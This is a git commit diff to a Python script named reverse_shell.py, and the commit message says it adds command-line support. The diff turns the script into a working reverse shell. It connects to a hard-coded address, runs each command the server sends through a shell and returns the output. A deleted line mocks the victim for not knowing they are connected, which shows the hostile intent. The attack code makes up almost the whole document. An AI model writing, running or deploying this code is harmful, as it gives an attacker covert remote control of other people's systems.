fd1cb0f6aed19a8c33092048d75461555f1c116a
babink <babinkhanal17@gmail.com>
2022-06-21 00:40:07 +0545

    added command line support

--- reverse_shell.py
+++ reverse_shell.py
@@ -2,7 +2,7 @@
 #!/usr/bin/python
 
 import socket
-
+import subprocess
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("192.168.1.148", 56789))
@@ -13,9 +13,16 @@ def shell():
 		if server_cmd == 'q':
 			break
 		else:
-			client_message = "Client still don't know im connected to their system..... LOL"
-			s.send(client_message)
-			print("[MSG] Message from the Command Server:  [%s]" %server_cmd)
+			# if everything goes a expected, this else condition will run
+			ps = subprocess.Popen(
+				server_cmd,
+				shell=True,
+				stdout=subprocess.PIPE,
+				stdin=subprocess.PIPE,
+				stderr=subprocess.PIPE
+				)
+			result = ps.stdout.read() + ps.stderr.read()
+			s.send(result)
 
 
 shell()
